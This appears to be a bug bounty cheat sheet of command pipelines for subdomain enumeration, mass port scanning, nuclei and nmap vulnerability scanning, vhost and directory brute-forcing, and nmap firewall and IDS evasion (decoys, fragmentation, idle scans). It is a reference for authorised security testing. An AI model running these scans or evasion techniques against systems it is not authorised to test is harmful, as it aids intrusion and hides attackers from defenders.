# 🚀 Master One-Liner Commands

> **Purpose**: A consolidated repository of high-speed, multi-tool pipelines for every phase of a bug bounty hunt.

---


# Subdomain Enumeration (Phase 3.2 Wildcard) ^oneliner-subdomains

### **Phase 1: Broad Passive Enumeration**

```bash
# [PASSIVE - AMASS] Perform a deep passive enumeration using Amass to map the attack surface from public data sources.
amass enum -passive -d target.com -o amass.txt

# [PASSIVE - AMASS INTEL] Go beyond simple enumeration; use Amass to discover associated ASNs and CIDRs, which are foundational for deeper recon.
amass intel -d target.com -whois -o amass_intel.txt

# [PASSIVE - FINDOMAIN] Execute Findomain for rapid subdomain discovery from various online services.
findomain -t target.com -u findomain.txt

# [PASSIVE - THEHARVESTER] Gather subdomains, hosts, and other OSINT from all available public sources simultaneously.
theharvester -d target.com -b all -f harvester.txt

# [PASSIVE - SUBLIST3R] Use Sublist3r to enumerate subdomains from search engines and third-party services like Netcraft.
python sublist3r.py -d target.com -o sublist3r.txt

# [PASSIVE - SUBFINDER] Use Subfinder with all configured API keys for a comprehensive passive-only scan.
subfinder -d target.com -all -silent --recursive -o subfinder.txt

# [PASSIVE - CHAOS] Pull known, validated subdomains directly from Project Discovery's Chaos dataset (requires API key).
chaos -d target.com -silent -o chaos.txt

# [PASSIVE - PUREDNS (PASSIVE)] Use puredns with public resolvers to validate a list of domains passively scraped from common crawl.
curl "<http://index.commoncrawl.org/CC-MAIN-2022-05-index?url=*.target.com&output=json>" | jq -r .url | puredns resolve -r resolvers.txt -w commoncrawl.txt

# [PASSIVE - ASSETFINDER] Quickly find domains and subdomains related to the target using Assetfinder.
assetfinder --subs-only target.com > assetfinder.txt

# [PASSIVE - WAYBACK MACHINE] Extract historical URLs for a domain and parse them to find legacy subdomains.
waybackurls target.com | unfurl -u domains | grep "\\\\.target\\\\.com$" | sort -u > wayback.txt

# [PASSIVE - ONEFORALL] Execute the comprehensive OneForAll framework to run a massive number of enumeration techniques.
python3 OneForAll/oneforall.py --target target.com run

# [PASSIVE - SHODAN] Use shosubgo to quickly enumerate subdomains from Shodan's indexed data (requires API key).
shosubgo -d target.com -s YOUR_SHODAN_API_KEY -o shodan.txt

# [PASSIVE - URLSCAN.IO] Use the urlscan.py script to extract subdomains from urlscan.io's database.
python urlscan.py -d target.com --mode subdomains > urlscan.txt

# [PASSIVE - ALIENVAULT] Run the alienvault.sh script to pull URLs and extract subdomains from AlienVault OTX.
./alienvault.sh target.com | unfurl -u domains | grep "\\\\.target\\\\.com$" | sort -u > alienvault.txt

# [PASSIVE - VIRUSTOTAL] Use the virustotal.sh script or a direct API call to find subdomains and domain siblings.
curl -s "<https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_VT_API_KEY&domain=target.com>" | jq -r '.subdomains[], .domain_siblings[]' | sort -u > virustotal.txt
```

### **Phase 2: Deep OSINT & Content Analysis**

```bash
# [CERTIFICATE TRANSPARENCY - CRT.SH] Query crt.sh and parse the JSON output to extract and clean subdomains from CT logs.
curl -s "<https://crt.sh/?q=%.target.com&output=json>" | jq -r '.[].name_value' | sed 's/\\\\*\\\\.//g' | sort -u > crtsh.txt

# [CERTIFICATE TRANSPARENCY - CENSYS] Use the Censys CLI to find subdomains via certificate analysis (requires API ID and Secret).
censys search 'parsed.names: target.com' --index-type hosts --fields "dns.names" | grep -o '[^"]*target\\.com' | sort -u > censys.txt

# [CERTIFICATE TRANSPARENCY - CERTSPOTTER] Use CertSpotter's API to find DNS names from certificates and filter for the target domain.
curl -s "<https://certspotter.com/api/v0/certs?domain=target.com>" | jq -r '.[].dns_names[]' | sed 's/\\\\"//g' | sed 's/\\\\*\\\\.//g' | sort -u | grep target.com > certspotter.txt

# [CERTIFICATE TRANSPARENCY - CTAIL] Tail Certificate Transparency logs in real-time to discover newly issued subdomains as they appear.
ctail -f -m '^.*\\\\.target\\\\.com'

# [WAYBACK MACHINE] Scour historical web archives for URLs, then extract and sanitize potential subdomains.
waybackurls target.com | unfurl -u domains | grep "\\\\.target\\\\.com$" | sort -u > wayback.txt

# [GITHUB CODE LEAKAGE] Run the github-subdomains tool to find subdomains exposed in public code on GitHub.
github-subdomains -d target.com -t YOUR_GITHUB_TOKEN -o github.txt

# [GITHUB CODE LEAKAGE - TRUFFLEHOG] Scan a target GitHub organization for secrets, which often reveals internal hostnames and subdomains.
trufflehog github --org=TargetOrg --only-verified > trufflehog.txt

# [JAVASCRIPT ANALYSIS] Find hidden subdomains and endpoints by running SubDomainizer against a target's primary web page.
python3 SubDomainizer.py -u <https://www.target.com> -o subdomainizer.txt

# [FAVICON HASHING] Use favfreak to find related domains by matching favicon hashes against a known hash from the main site.
python3 favfreak.py -d target.com --shodan-api YOUR_SHODAN_API_KEY -o favicon.txt

```

### Phase 3: Infrastructure & Validation (OPSEC)

```bash
# [INFRA-PREP] Generate a fresh, validated list of public DNS resolvers to ensure high-speed and reliable active enumeration.
dnsvalidator -tL <https://public-dns.info/nameservers-all.txt> -threads 50 -o resolvers.txt

```

### **Phase 4: Active Bruteforcing & Permutation**

```bash
# [ACTIVE-BRUTEFORCE] Perform a fast, multi-threaded DNS bruteforce attack against the target domain.
python subbrute.py -t target.com

# [ACTIVE-BRUTEFORCE] Generate a custom wordlist by spidering the target site for unique terms to use in targeted bruteforcing.
ruby DNScewl.rb -d 2 -w custom_wordlist.txt <http://target.com>

# [PERMUTATION] Generate intelligent domain permutations from a list of known subdomains and a custom wordlist.
cat list.txt | dnsgen -w ~/wordlists/dnsgen.txt

# [PERMUTATION] Generate and resolve permutations of known subdomains to discover related, unlisted assets.
altdns -i subdomains.txt -o permutations_output.txt -w words.txt

# [VALIDATED-BRUTEFORCE] Use the custom resolver list for high-speed, reliable bruteforcing and resolution of a final subdomain list.
shuffledns -d target.com -w /path/to/best-dns-wordlist.txt -r resolvers.txt -o subdomains_final.txt -v

# [AGGREGATE FOR BRUTEFORCE] Combine the passive results and generated permutations into a final master list for resolution.
cat passive_unique.txt permutations.txt | sort -u > master_list.txt

# [VALIDATED-BRUTEFORCE] Use puredns to conduct a high-speed bruteforce and accurately resolve the master list, filtering out wildcards.
puredns resolve master_list.txt -r resolvers.txt -w resolved_final.txt

# [FINAL-RESOLUTION] As an alternative, use dnsx to quickly validate the master list and output only the successful responses.
dnsx -l master_list.txt -r resolvers.txt -resp -o resolved_final.txt

# [INFRA-PREP] Generate a fresh, validated list of public DNS resolvers for high-speed and reliable active enumeration.
dnsvalidator -tL <https://public-dns.info/nameservers-all.txt> -threads 50 -o resolvers.txt

# [ZONE TRANSFER - DIG] Automatically find a domain's name servers and attempt a zone transfer (AXFR) against each one.
for ns in $(host -t ns target.com | cut -d ' ' -f 4); do dig axfr target.com @"$ns"; done

# [ZONE TRANSFER - DNSRECON] Use DNSRecon to specifically test for and exploit a misconfigured zone transfer.
dnsrecon -d target.com -t axfr

# [BRUTEFORCE - GOBUSTER] Use gobuster's DNS mode to perform a standard subdomain bruteforce attack.
gobuster dns -d target.com -w wordlist.txt -o gobuster.txt

# [BRUTEFORCE - SUBBRUTE] Run the classic subbrute tool for a fast, multi-threaded DNS bruteforce.
python3 subbrute.py target.com -w wordlist.txt -o subbrute.txt

# [BRUTEFORCE - PUREDNS] Conduct a high-speed bruteforce with a large wordlist and accurately resolve results, filtering out wildcards.
puredns bruteforce /path/to/best-dns-wordlist.txt -d target.com -r resolvers.txt -w bruteforce_resolved.txt

# [BRUTEFORCE - KSUBDOMAIN] As an alternative, launch a high-speed, stateless DNS bruteforce using ksubdomain.
ksubdomain -d target.com -w /path/to/best-dns-wordlist.txt -r resolvers.txt -o ksubdomain_resolved.txt

# [BRUTEFORCE & RESOLVE - PUREDNS] Conduct a high-speed bruteforce and accurately resolve the master list, filtering out wildcards.
puredns resolve master_list.txt -r resolvers.txt -w resolved_active.txt

# [BULK RESOLUTION - MASSDNS] Use MassDNS with a list of resolvers for high-performance bulk DNS lookups against the master list.
massdns -r resolvers.txt -t A -o S -w massdns.txt master_list.txt

# [MASTER LIST RESOLUTION - PUREDNS] Resolve the entire master list of discovered and permuted domains, saving live hosts.
puredns resolve master_list.txt -r resolvers.txt -w resolved_from_master.txt

# [MASTER LIST RESOLUTION & PROBING - DNSX+HTTPX] Chain dnsx and httpx to resolve the master list and immediately probe for live web servers, gathering titles, status codes, and tech stacks.
dnsx -l master_list.txt -r resolvers.txt -silent | httpx -silent -title -tech-detect -status-code -o live_web_servers.txt

# [FINAL AGGREGATION & VALIDATION - DNSX] Combine all resolved assets and use dnsx to perform a final validation.
cat *_resolved.txt | sort -u | dnsx -r resolvers.txt -a -aaaa -cname -resp -o final_resolved_live.txt

# [DATA EXTRACTION] From the final list of live web servers, extract just the URLs for input into other tools like Nuclei or Burp Suite.
cat live_web_servers.txt | cut -d ' ' -f 1 > final_urls.txt

# [SCREENSHOTTING] Use gowitness against the final list of live web servers to visually identify interesting targets.
gowitness file -f live_web_servers.txt --disable-db -o screenshots/

# [VHOST ENUMERATION - FFUF] Bruteforce subdomains via the Host header against a known web server IP to find virtual hosts.
ffuf -u https://<TARGET_IP> -H "Host: FUZZ.target.com" -w master_list.txt -mc 200,403

# [TLS CERTIFICATE GRABBING] Scan discovered IP ranges and extract subdomains directly from their TLS certificates' SAN/CN fields.
cat resolved_ips.txt | tlsx -san -cn -silent -resp-only -o tls_subs.txt

```

### **Phase 5: Data Aggregation & Permutation Generation**

```bash
# [AGGREGATE] Combine all passive enumeration results into a single, sorted, unique list of seed subdomains.
cat *.txt | sort -u > passive_unique.txt

# [WORDLIST-GEN] Create a highly-targeted wordlist by crawling the main site and extracting unique words with DNScewl.
ruby DNScewl.rb -d 2 -w custom_wordlist.txt <http://target.com>

# [PERMUTATION - DNSGEN] Generate intelligent domain permutations from the list of known passive subdomains using dnsgen.
cat passive_unique.txt | dnsgen -w custom_wordlist.txt > dnsgen_perms.txt

# [PERMUTATION - ALTERX] Use alterx to create a different set of permutations, enriching with data from public sources.
cat passive_unique.txt | alterx -enrich > alterx_perms.txt

# [PERMUTATION - DNSGEN] Generate intelligent domain permutations from the list of known passive subdomains using dnsgen.
cat passive_unique.txt | dnsgen -w custom_wordlist.txt > dnsgen_perms.txt

# [NEW - PERMUTATION - ALTERX] Use alterx to create a different set of permutations, enriching with data from public sources.
cat passive_unique.txt | alterx -enrich > alterx_perms.txt

# [PERMUTATION - GOTATOR] Use gotator to create permutations with specified depth and numbers for a comprehensive wordlist.
gotator -sub passive_unique.txt -perm custom_wordlist.txt -depth 1 -numbers 3 > gotator_perms.txt

# [CONSOLIDATE FOR BRUTEFORCE] Combine the passive results and all generated permutations into a final master list.
cat passive_unique.txt *_perms.txt | sort -u > master_list.txt

```

### **Phase 6: Advanced & Final Resolution**

```bash
# [REVERSE DNS] Perform a reverse DNS lookup (PTR) on a list of resolved IPs to find associated infrastructure hostnames.
cat resolved_active.txt | cut -d ' ' -f 2 | sort -u | dnsx -ptr -resp-only -o reverse_dns.txt

# [REVERSE DNS] Perform a reverse DNS lookup (PTR) on a list of resolved IPs to find additional associated hostnames.
cat final_resolved_live.txt | cut -d' ' -f2 | grep -oE "\\b([0-9]{1,3}\\\\.){3}[0-9]{1,3}\\b" | sort -u | dnsx -ptr -resp-only -o reverse_dns.txt

# [CLOUD ENUMERATION - S3SCANNER] Scan a list of generated permutations to find valid S3 bucket names.
s3scanner -f dnsgen_perms.txt > s3_buckets.txt

# [CLOUD ENUMERATION - CLOUDENUM] A broader tool to discover public cloud assets (S3, Azure Blobs, etc.) for the target keyword.
cloud_enum -k target.com -qs -l cloud_assets.txt

# [ASN DISCOVERY - ASNMAP] Discover all IP ranges associated with a target's domain using asnmap.
asnmap -d target.com -o asn_ips.txt

# [ASN DISCOVERY - AMASS] Use Amass to discover all network ranges (CIDRs) associated with a target's ASN for deeper scanning.
amass intel -asn $(asnmap -d target.com -silent) -o cidrs.txt

# [CLOUD ENUMERATION] Run cloud_enum to discover public cloud assets (S3, Azure Blobs, etc.) for the target keyword.
cloud_enum -k target.com

# [FINAL VALIDATION - SHUFFLEDNS] Use shuffledns to resolve the final master list and verify all discovered assets are live.
shuffledns -d target.com -list master_list.txt -r resolvers.txt -o final_resolved.txt

# [FINAL VALIDATION - DNSX] As an alternative, use dnsx to quickly validate the master list and output only the successful responses.
dnsx -l master_list.txt -r resolvers.txt -resp -o final_resolved.txt

```

---



---


# Active Scanning & VHost Discovery (Phase 3.3 & 3.0.9) ^oneliner-activescan

### **Phase 0: Initial Scoping & Host Discovery**

```bash
# [PRE-SCAN PREP] Resolve a list of domains to unique IP addresses, creating a clean target list for scanning.
cat domains.txt | dnsx -a -resp -silent | cut -d ' ' -f 2 | sed 's/\\[//;s/\\]//' | sort -u > ips.txt

# [PASSIVE ENUMERATION] Combine multiple popular tools for comprehensive passive subdomain discovery.
(subfinder -d target.com -silent; assetfinder --subs-only target.com) | sort -u > subdomains_passive.txt

# [ACTIVE ENUMERATION] Use Amass for in-depth active enumeration to find additional subdomains and related infrastructure.
amass enum -active -d example.com -o amass_active.txt

# [SUBDOMAIN BRUTE-FORCE] Use ffuf to brute-force subdomains against a target domain using a wordlist.
ffuf -u "<https://FUZZ.target.com>" -w wordlist.txt -mc 200,301,302 -fs 0 > ffuf_brute_subs.txt

# [REVERSE DNS ENUMERATION] Perform a reverse DNS lookup on a CIDR range to discover domains associated with target IPs.
mapcidr -cidr 1.2.3.0/24 -silent | hakrevdns -d > reverse_dns_domains.txt

# [ASN DISCOVERY] Map a target domain to its ASN to discover all associated IP ranges for a comprehensive network footprint.
asnmap -d target.com | dnsx -silent -resp-only > asn_ips.txt

# [TLS CERTIFICATE DISCOVERY] Scan an entire CIDR block on common TLS ports to extract hostnames from certificate Subject Alternative Names (SANs).
mapcidr -cidr 1.2.3.0/24 -silent | tlsx -san -cn -silent -resp-only -p 443,8443,10000 > cert_subdomains.txt

# [CDN/WAF BYPASS] Check a list of domains for origin IPs using OSINT from Shodan/Censys.
uncover -e shodan,censys -q 'ssl:"target.com"' | cut -d':' -f1 | sort -u > potential_origin_ips.txt

# [INTERNAL DISCOVERY - ARP SCAN] On a local network segment, discover all live hosts using ARP requests. (Requires root).
nmap -sn -PR 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' > live_internal_hosts.txt

# [INTERNAL DISCOVERY - ICMP SCAN] Sweep a network range using ICMP echo requests to find hosts that respond to ping.
nmap -sn -PE 192.168.1.0/24 -oG - | awk '/Up$/{print $2}' > live_internal_hosts.txt
```

### **Phase 1: Broad Port Discovery (Fast & Wide)**

```bash
# [INITIAL SCAN] Rapidly scan all subdomains for the top 1,000 most common TCP ports to quickly identify standard services.
naabu -top-ports 1000 -l subdomains_final.txt -silent -o ports_top1000.txt

# [ULTRA-FAST SCAN] Use masscan for maximum speed when scanning a large list of IPs for all 65,535 TCP ports.
masscan -p1-65535 -iL ips.txt --max-rate 100000 -oG masscan_all_ports.txt

# [ADAPTIVE FAST SCAN] Use rustscan to automatically find all open ports quickly and pass them to nmap for scripting.
rustscan -a ips.txt --ulimit 5000 -- -sV -sC -A -oN rustscan_results.txt

# [NON-STANDARD DISCOVERY] Scan all 65,535 ports on all subdomains, excluding common web ports, to uncover hidden management interfaces or non-standard services.
naabu -l subdomains_final.txt -p - -exclude-ports 80,443,8443 -ec -silent -o ports_non-web.txt

# [CUSTOM PORT SCAN] Scan a curated list of non-standard but interesting ports (e.g., 8000, 8080, 9000, 3000) across all subdomains.
naabu -iL subdomains_final.txt -p 81,300,591,593,832,981,1010,1311,2082,2087,2095,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017 -silent -o ports_custom.txt

# [CIDR SWEEP] When provided a network range (CIDR), scan all hosts within it for all TCP ports to map the entire network block.
naabu -list cidr.txt -p - -silent -o ports_cidr_all.txt

# [UDP PORT SCAN] Scan a list of hosts for the top 100 most common UDP services. (Note: UDP scanning is inherently slower and less reliable).
naabu -l ips.txt -top-ports 100 -s u -silent -o ports_udp_top100.txt

# [SINGLE TARGET QUICK SCAN] Perform a rapid port scan on a single, high-value IP to get an immediate sense of its open services.
naabu -host 120.233.134.55 -v -top-ports 1000
```

```bash
# FULL PORT SCAN
naabu -iL sub.txt -p 1-10000,10001-10010,10999,11099,10012,10024-10025,10082,47001,45000,45001,11111,47002,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000-27020,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389,280,4567,7001,8008,9080,24616,24800,24999-25001,25174,25260,25262,25288,25327,25445,25473,25486,25565,25703,25717,25734-25735,25847,26000-26001,26007,26208,26214,26340,26417,26470,26669,26972,27000-27003,27005,27007,27009-27010,27015-27019,27055,27074-27075,27087,27204,27316,27350-27353,27355-27357,27372,27374,27521,27537,27665,27715,27770,28017,28114,28142,28201,28211,28374,28567,28717,28850-28851,28924,28967,29045,29152,29243,29507,29672,29810,29831,30000-30001,30005,30087,30195,30299,30519,30599,30644,30659,30704-30705,30718,30896,30951,31033,31038,31058,31072,31337,31339,31386,31416,31438,31522,31657,31727-31728,32006,32022,32031,32088,32102,32200,32219,32260-32261,32764-32765,32767-32792,32797-32799,32803,32807,32814-32816,32820,32822,32835,32837,32842,32858,32868-32869,32871,32888,32897-32898,32904-32905,32908,32910-32911,32932,32944,32960-32961,32976,33000,33011,33017,33070,33087,33124,33175,33192,33200,33203,33277,33327,33335,33337,33354,33367,33395,33444,33453,33522-33523,33550,33554,33604-33605,33841,33879,33882,33889,33895,33899,34021,34036,34096,34189,34317,34341,34381,34401,34507,34510,34571-34573,34683,34728,34765,34783,34833,34875,35033,35050,35116,35131,35217,35272,35349,35392-35393,35401,35500,35506,35513,35553,35593,35731,35879,35900-35901,35906,35929,35986,36046,36104-36105,36256,36275,36368,36436,36508,36530,36552,36659,36677,36694,36710,36748,36823-36824,36914,36950,36962,36983,37121,37151,37174,37185,37218,37393,37522,37607,37614,37647,37674,37777,37789,37839,37855,38029,38037,38185,38188,38194,38205,38224,38270,38292,38313,38331,38358,38446,38481,38546,38561,38570,38761,38764,38780,38805,38936,39067,39117,39136,39265,39293,39376,39380,39433,39482,39489,39630,39659,39732,39763,39774,39795,39869,39883,39895,39917,40000-40003,40005,40011,40193,40306,40393,40400,40457,40489,40513,40614,40628,40712,40732,40754,40811-40812,40834,40911,40951,41064,41123,41142,41250,41281,41318,41342,41345,41348,41398,41442,41511,41523,41551,41632,41773,41794-41795,41808,42001,42035,42127,42158,42251,42276,42322,42449,42452,42510,42559-42560,42575,42590,42632,42675,42679,42685,42735,42906,42990,43000,43002,43018,43027,43103,43139,43143,43188,43212,43231,43242,43425,43654,43690,43734,43823,43868,44004,44101,44119,44176,44200,44334,44380,44410,44431,44442-44443,44479,44501,44505,44541,44616,44628,44704,44709,44711,44965,44981,45038,45050,45100,45136,45164,45220,45226,45413,45438,45463,45602,45624,45697,45777,45864,45960,46034,46069,46115,46171,46182,46200,46310,46372,46418,46436,46593,46813,46992,46996,47012,47029,47119,47197,47267,47348,47372,47448,47544,47557,47567,47581,47595,47624,47634,47700,47777,47806,47850,47858,47860,47966,47969,48009,48067,48080,48083,48127,48153,48167,48356,48434,48619,48631,48648,48682,48783,48813,48925,48966-48967,48973,49002,49048,49132,49152-49161,49163-49173,49175-49176,49179,49186,49189-49191,49195-49197,49201-49204,49211,49213,49216,49228,49232,49235-49236,49241,49275,49302,49352,49372,49398,49400-49401,49452,49498,49500,49519-49522,49597,49603,49678,49751,49762,49765,49803,49927,49999-50003,50006,50016,50019,50040,50050,50101,50189,50198,50202,50205,50224,50246,50258,50277,50300,50356,50389,50500,50513,50529,50545,50576-50577,50585,50636,50692,50733,50787,50800,50809,50815,50831,50833-50836,50849,50854,50887,50903,50945,50997,51011,51020,51037,51067,51103,51118,51139,51191,51233-51235,51240,51300,51343,51351,51366,51413,51423,51460,51484-51485,51488,51493,51515,51582,51658,51771-51772,51800,51809,51906,51909,51961,51965,52000-52003,52025,52046,52071,52173,52225-52226,52230,52237,52262,52391,52477,52506,52573,52660,52665,52673,52675,52710,52735,52822,52847-52851,52853,52869,52893,52948,53085,53178,53189,53211-53212,53240,53313-53314,53319,53361,53370,53460,53469,53491,53535,53633,53639,53656,53690,53742,53782,53827,53852,53910,53958,54045,54075,54101,54127,54235,54263,54276,54320-54321,54323,54328,54514,54551,54605,54658,54688,54722,54741,54873,54907,54987,54991,55000,55020,55055-55056,55183,55187,55227,55312,55350,55382,55400,55426,55479,55527,55555-55556,55568-55569,55576,55579,55600,55635,55652,55684,55721,55758,55773,55781,55901,55907,55910,55948,56016,56055,56259,56293,56507,56535,56591,56668,56681,56723,56725,56737-56738,56810,56822,56827,56973,56975,57020,57103,57123,57294,57325,57335,57347,57350,57352,57387,57398,57479,57576,57665,57678,57681,57702,57730,57733,57797,57891,57896,57923,57928,57988,57999,58001-58002,58072,58080,58107,58109,58164,58252,58305,58310,58374,58430,58446,58456,58468,58498,58562,58570,58610,58622,58630,58632,58634,58699,58721,58838,58908,58970,58991,59087,59107,59110,59122,59149,59160,59191,59200-59202,59239,59340,59499,59504,59509-59510,59525,59565,59684,59778,59810,59829,59841,59987,60000,60002-60003,60020,60055,60086,60111,60123,60146,60177,60227,60243,60279,60377,60401,60403,60443,60485,60492,60504,60544,60579,60612,60621,60628,60642,60713,60728,60743,60753,60782-60783,60789,60794,60989,61159,61169-61170,61402,61473,61516,61532,61613,61616-61617,61669,61722,61734,61827,61851,61900,61942,62006,62042,62078,62080,62188,62312,62519,62570,62674,62866,63105,63156,63331,63423,63675,63803,64080,64127,64320,64438,64507,64551,64623,64680,64726-64727,64890,65000,65048,65129,65301,65310-65311,65389,65488,65514 -retries 5 -no-color -silent -o redact-ports.txt
```

### **Phase 2: Live Web Server Identification**

```bash
# [WEB SERVER VALIDATION] Probe the list of subdomains to identify which are running live web servers and capture their HTTP titles and status codes.
httpx -l subdomains_final.txt -probe -title -status-code -threads 100 -silent -o hosts_live.txt

# [NON-STANDARD WEB PORT PROBE] Specifically check for web servers on common alternate ports (8080, 8000, 8888, etc.) across all subdomains.
cat subdomains_final.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 -title -status-code -silent -o hosts_live_custom_ports.txt

# [ENRICHED WEB PROBE] Perform an advanced probe to detect technology, extract titles, identify WAFs, and save the rich data to a JSON file for programmatic analysis.
httpx -l subdomains_final.txt -tech-detect -title -sc -wc -waf -cdn -json -o hosts_live_enriched.json

# [SEAMLESS SCAN-TO-PROBE WORKFLOW] Pipe the output of a fast port scan directly into httpx to immediately validate which open ports are running web services.
naabu -l ips.txt -p - -silent | httpx -silent -title -tech-detect -o live_web_services.txt

# [RAPID TRIAGE VIA TITLE] Quickly parse a list of live web servers to identify interesting applications by grepping for keywords like 'Login', 'Admin', 'Dashboard', 'Jira', 'Grafana'.
cat hosts_live.txt | get-title | grep -iE "login|admin|dashboard|jira|grafana|jenkins"

```

### **Phase 3: Deep Service Enumeration & Vulnerability Analysis**

```bash
# [LOUD & AGGRESSIVE SCAN] On a single high-value target where stealth is not a concern, run a full, all-ports scan to detect OS, services, versions, and run default scripts.
nmap -p- -A -T4 -v <TARGET_IP> -Pn

# [VULNERS SCRIPT SCAN] Run a targeted Nmap scan against a host to identify the service version and automatically correlate it with known exploits from the Vulners database.
nmap -sV --script=vulners <TARGET_IP> -Pn

# [NMAP BUILT-IN VULN SCAN] Run a targeted Nmap scan using all scripts in the 'vuln' category to find common vulnerabilities.
nmap -sV --script=vuln <TARGET_IP> -Pn

# [INTEGRATED PORT & SERVICE SCAN] Combine Naabu's speed with Nmap's deep analysis by automatically running Nmap scripts on any discovered open ports.
naabu -iL ips.txt -p - -c 50 -nmap-cli 'nmap -sV -sC -T4' -o naabu_nmap_scan.txt

# [MASS VULNERABILITY SCANNING] Feed a list of IPs (e.g., from Shodan) directly into Nuclei to rapidly scan for specific CVEs or technologies at scale.
cat ips.txt | nuclei -tags cve,rce,unauth -bs 50 -c 50 -es info > nuclei_mass_scan.txt

# [TECHNOLOGY-AWARE NUCLEI SCAN] Use Nuclei's automatic technology detection to run only relevant templates against a list of hosts.
nuclei -l hosts_live.txt -as -es info -o nuclei_tech_scan.txt

# [TARGETED TECH-STACK SCAN WORKFLOW] Extract hosts running a specific technology (e.g., Jenkins) from httpx JSON output and scan them with Nuclei.
cat hosts_live_enriched.json | jq -r 'select(.technologies[]? | contains("Jenkins")) | .url' | nuclei -t jenkins/ -o nuclei_jenkins_findings.txt

# [AUTOMATED MASS NMAP SCAN] Read a file of IP:PORT combinations (from naabu) and run a targeted Nmap version and vulnerability scan on each one individually, automating the deep-dive process at scale.
cat hosts_and_ports.txt | xargs -I '{}' sh -c 'IP=$(echo {} | cut -d: -f1); PORT=$(echo {} | cut -d: -f2); nmap -T4 -p $PORT -sV --script=vulners,vuln $IP -Pn' | tee nmap_mass_scan_results.txt

# [STANDARD SERVICE SCAN] The workhorse Nmap scan: Stealth SYN scan with service version detection, OS detection, and default scripts on a single target.
nmap -sS -A -T4 -v <TARGET_IP> -Pn

# [TARGETED PORT SCAN] Run a deep service scan only on specific ports discovered in Phase 2.
nmap -sV -sC -p80,443,8080 -iL live_hosts.txt -oN nmap_webonly_results.txt

# [AUTOMATED MASS NMAP] Pipe IP:PORT combinations from naabu/masscan into Nmap for automated, scaled-out deep analysis.
cat ports_all.txt | xargs -I '{}' sh -c 'nmap -sV -sC --script=vuln,vulners -p $(echo {} | cut -d: -f2) $(echo {} | cut -d: -f1) -Pn' | tee nmap_mass_scan.txt

# [SEARCHSPLOIT INTEGRATION] Scan and immediately cross-reference service versions with the offline Exploit-DB database.
nmap -sV -p- <TARGET_IP> -oX scan.xml && searchsploit --nmap scan.xml
```

### **Phase 4: Virtual Host & Content Discovery**

```bash
# [VHOST FUZZING - SUBDOMAIN BASED] On a target IP, brute-force the 'Host' header using known subdomains to uncover hidden applications or APIs hosted on the same server.
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.target.com" -w subdomains_final.txt -ac -o ffuf_vhost_subdomain.json

# [VHOST FUZZING - GENERIC WORDLIST] Brute-force the 'Host' header on a target IP with a generic wordlist to discover non-public virtual hosts like 'dev', 'staging', or 'internal'.
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.target.com" -w virtual-host-wordlist.txt -ac -o ffuf_vhost_generic.json

# [VHOST FUZZING WITH NOISE REDUCTION] Use ffuf's intelligent filtering to automatically ignore wildcard responses by matching against a known bad VHost.
ffuf -u http://<TARGET_IP> -w wordlist.txt -H "Host: FUZZ.target.com" -ac --hh 12345 # Use --hh/--hw/--hc with a baseline response from a garbage Host header.

# [VHOST DISCOVERY - TLS CERTIFICATES] Extract hostnames from the Subject Alternative Name (SAN) of SSL certificates.
cat ips.txt | cero | sort -u > vhosts_from_certs.txt

# [HISTORICAL URL DISCOVERY] Use waybackurls to gather all known URLs for a domain from archival sources, then filter for live ones.
waybackurls target.com | httpx -status-code -mc 200 -silent > wayback_live_urls.txt

# [WEB CONTENT DISCOVERY] Brute-force directories and files on a live web server using a wordlist.
ffuf -w /path/to/wordlist.txt -u <https://target.com/FUZZ> -e .php,.html,.txt,.bak -ac -o ffuf_content.json

# [RECURSIVE CONTENT DISCOVERY] Use dirsearch with recursion to perform a deep brute-force of web directories.
dirsearch -u <https://target.com> --full-url --deep-recursive -r -o dirsearch_report.txt

# [API & CONTENT DISCOVERY] Use Kiterunner to scan for API endpoints and content using a specialized methodology that goes beyond simple brute-forcing.
kr scan <https://target.com> -A=apiroutes-210228 -x 10 -o kiterunner_scan.txt

# [IIS SHORTNAME DISCOVERY] Scan an IIS server for hidden files and folders vulnerable to the 8.3 filename convention.
java -jar iis_shortname_scanner.jar 2 20 "<https://vulnerable-iis-server.com>"

```

### **Phase 6: Evasion & Advanced Scanning (When Defenses are Active)**

```bash
# [FIREWALL BYPASS - FRAGMENTATION] Split packets into 8-byte fragments to evade simple packet inspection firewalls.
nmap -f -Pn <TARGET_IP>

# [FIREWALL BYPASS - SOURCE PORT SPOOFING] Make scan traffic appear to originate from a common port like DNS (53) or HTTP (80).
nmap -g 53 -Pn <TARGET_IP>

# [IDS EVASION - DECOY SCAN] Obfuscate your true source IP by launching the scan from multiple spoofed decoy addresses.
nmap -D RND:10 <TARGET_IP>

# [IDS EVASION - IDLE SCAN] Perform an extremely stealthy scan by reflecting it off an idle "zombie" host on the network.
nmap -sI <ZOMBIE_IP> <TARGET_IP>

# [THRESHOLD EVASION - LOW & SLOW] Perform a very slow scan with a 2-second delay between probes and multiple retries to evade rate-based IDS/IPS triggers.
nmap -sS --scan-delay 2s --max-retries 3 -p- <TARGET_IP> -Pn

# [FIREWALL RULESET MAPPING] Use an ACK scan to probe a firewall without determining if a port is open. A response indicates the firewall is stateful; no response may indicate a simpler packet filter.
nmap -sA -T4 <TARGET_IP>

